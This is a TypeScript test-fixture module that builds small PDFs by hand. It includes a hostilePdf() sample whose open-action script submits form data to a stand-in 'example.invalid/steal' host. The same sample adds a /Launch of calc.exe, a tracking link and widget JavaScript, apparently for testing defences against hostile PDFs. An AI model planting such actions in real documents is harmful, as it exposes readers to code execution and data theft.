/**
 * Test-only: builds small valid PDFs by hand (no PDF tooling needed), for the unit tests and for the QA frames.
 * Never imported by app code.
 */

export interface FixturePage {
  /** Lines of Helvetica text, top to bottom. */
  lines: string[];
  /** Raw annotation dictionaries (without the surrounding << >>) added to the page. */
  annots?: string[];
  /** Page size in points. Default A4-ish Letter 612 x 792. */
  size?: [number, number];
}

export interface FixtureOptions {
  pages: FixturePage[];
  /** A document-level JavaScript run on open (/OpenAction). */
  openActionJs?: string;
  /** Names-tree document JavaScript. */
  namedJs?: string;
  /** Make the document need a password (a fake /Encrypt that no password satisfies). */
  encrypted?: boolean;
  /** Drop the trailer and %%EOF so the file looks cut off. */
  truncate?: boolean;
}

const enc = new TextEncoder();

function esc(s: string): string {
  return s.replace(/\\/g, "\\\\").replace(/\(/g, "\\(").replace(/\)/g, "\\)");
}

function hex(n: number): string {
  return Array.from({ length: n }, (_, i) => ((i * 37 + 11) & 0xff).toString(16).padStart(2, "0")).join("");
}

/** A valid PDF 1.7 with the given pages (and, optionally, scripts and links). */
export function buildPdf(o: FixtureOptions): Uint8Array {
  const objs: string[] = []; // index i holds object i+1
  const add = (body: string): number => objs.push(body);

  const catalog = add(""); // 1, filled below
  const pagesObj = add(""); // 2
  const font = add("<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"); // 3

  const pageIds: number[] = [];
  for (const p of o.pages) {
    const [w, h] = p.size ?? [612, 792];
    let y = h - 72;
    let stream = "BT /F1 18 Tf\n";
    for (const line of p.lines) {
      stream += `1 0 0 1 72 ${y} Tm (${esc(line)}) Tj\n`;
      y -= 26;
    }
    stream += "ET";
    const content = add(`<< /Length ${stream.length} >>\nstream\n${stream}\nendstream`);
    const annotIds = (p.annots ?? []).map((a) => add(`<< ${a} >>`));
    const annots = annotIds.length ? ` /Annots [${annotIds.map((id) => `${id} 0 R`).join(" ")}]` : "";
    pageIds.push(
      add(
        `<< /Type /Page /Parent ${pagesObj} 0 R /MediaBox [0 0 ${w} ${h}] /Contents ${content} 0 R /Resources << /Font << /F1 ${font} 0 R >> >>${annots} >>`,
      ),
    );
  }

  objs[pagesObj - 1] = `<< /Type /Pages /Kids [${pageIds.map((id) => `${id} 0 R`).join(" ")}] /Count ${pageIds.length} >>`;
  let cat = `<< /Type /Catalog /Pages ${pagesObj} 0 R`;
  if (o.openActionJs) {
    const js = add(`<< /S /JavaScript /JS (${esc(o.openActionJs)}) >>`);
    cat += ` /OpenAction ${js} 0 R`;
  }
  if (o.namedJs) {
    const js = add(`<< /S /JavaScript /JS (${esc(o.namedJs)}) >>`);
    cat += ` /Names << /JavaScript << /Names [(init) ${js} 0 R] >> >>`;
  }
  objs[catalog - 1] = cat + " >>";
  let encryptRef = "";
  if (o.encrypted) {
    // A standard-handler dictionary with a made-up /U: no password (not even the empty one) matches it.
    const e = add(`<< /Filter /Standard /V 1 /R 2 /O <${hex(32)}> /U <${hex(32).split("").reverse().join("")}> /P -4 >>`);
    encryptRef = ` /Encrypt ${e} 0 R /ID [<${hex(16)}> <${hex(16)}>]`;
  }

  let out = "%PDF-1.7\n%âãÏÓ\n";
  const offsets: number[] = [];
  objs.forEach((body, i) => {
    offsets.push(out.length);
    out += `${i + 1} 0 obj\n${body}\nendobj\n`;
  });
  if (o.truncate) return enc.encode(out.slice(0, Math.floor(out.length * 0.6)));
  const xref = out.length;
  out += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n`;
  for (const off of offsets) out += `${String(off).padStart(10, "0")} 00000 n \n`;
  out += `trailer\n<< /Size ${objs.length + 1} /Root ${catalog} 0 R${encryptRef} >>\nstartxref\n${xref}\n%%EOF\n`;
  // Latin-1 bytes: every char above is < 256.
  return Uint8Array.from(out, (c) => c.charCodeAt(0));
}

/** A one-page PDF with a document /OpenAction script, a link to an external URL and a /Launch action. */
export function hostilePdf(): Uint8Array {
  return buildPdf({
    pages: [
      {
        lines: ["Quarterly report", "This page also carries a script, a link and a launch action."],
        annots: [
          "/Type /Annot /Subtype /Link /Rect [72 600 400 640] /Border [0 0 0] /A << /S /URI /URI (https://example.invalid/tracking-pixel) >>",
          "/Type /Annot /Subtype /Link /Rect [72 540 400 580] /Border [0 0 0] /A << /S /Launch /F (calc.exe) >>",
          "/Type /Annot /Subtype /Widget /FT /Btn /Rect [72 480 200 520] /AA << /E << /S /JavaScript /JS (app.alert('widget');) >> >>",
        ],
      },
    ],
    openActionJs: "app.alert('pwned'); this.submitForm('https://example.invalid/steal');",
    namedJs: "app.launchURL('https://example.invalid/named');",
  });
}
